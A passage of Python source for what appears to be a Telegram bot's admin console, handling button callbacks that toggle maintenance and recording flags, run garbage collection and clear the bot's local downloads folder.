                InlineKeyboardButton(small_caps("ᴄᴏɴᴛʀᴏʟ"), callback_data="void_panel_control"),
                InlineKeyboardButton(small_caps("ᴏᴠᴇʀʀɪᴅᴇ"), callback_data="void_panel_override"),
            ],
            [
                InlineKeyboardButton(small_caps("ᴇᴠᴇɴᴛꜱ"), callback_data="void_panel_events"),
                InlineKeyboardButton(small_caps("ᴍᴇᴍᴏʀʏ"), callback_data="void_panel_memory")
            ],
            [InlineKeyboardButton(small_caps("ᴄʟᴏꜱᴇ ᴄᴏɴꜱᴏʟᴇ"), callback_data="void_action_close")]
        ])
        await callback_query.edit_message_text(f"<blockquote>{header} ❞</blockquote>\n" \
                                              f"<blockquote>{body}</blockquote>", reply_markup=buttons)
                                              
    elif data == "void_toggle_maint":
        is_maint = await db.get_setting("maintenance", "false")
        new_state = "false" if is_maint == "true" else "true"
        await db.set_setting("maintenance", new_state)
        await void_callbacks(client, callback_query)
        
    elif data == "void_toggle_phantom":
        VoidState.phantom_active = not VoidState.phantom_active
        await void_callbacks(client, callback_query)
        
    elif data == "void_toggle_observe":
        VoidState.observe_active = not VoidState.observe_active
        await void_callbacks(client, callback_query)
        
    elif data == "void_toggle_blackbox":
        if not VoidState.blackbox_recording:
            VoidState.blackbox_recording = True
            VoidState.blackbox_start = time.time()
            VoidState.blackbox_events = []
            
            async def run_blackbox_timer():
                await asyncio.sleep(300)
                if VoidState.blackbox_recording:
                    VoidState.blackbox_recording = False
            asyncio.create_task(run_blackbox_timer())
        else:
            VoidState.blackbox_recording = False
        await void_callbacks(client, callback_query)
        
    elif data == "void_trigger_gc":
        gc.collect()
        await void_callbacks(client, callback_query)
        
    elif data == "void_trigger_cleanup":
        downloads_dir = "downloads"
        count = 0
        if os.path.exists(downloads_dir):
            for filename in os.listdir(downloads_dir):
                file_path = os.path.join(downloads_dir, filename)
                try:
                    if os.path.isfile(file_path) or os.path.islink(file_path):
                        os.unlink(file_path)
                        count += 1
                    elif os.path.isdir(file_path):
                        shutil.rmtree(file_path)
                        count += 1
                except Exception:
                    pass
        await callback_query.answer(small_caps(f"ᴄʟᴇᴀʀᴇᴅ {count} ꜰɪʟᴇꜱ."), show_alert=True)
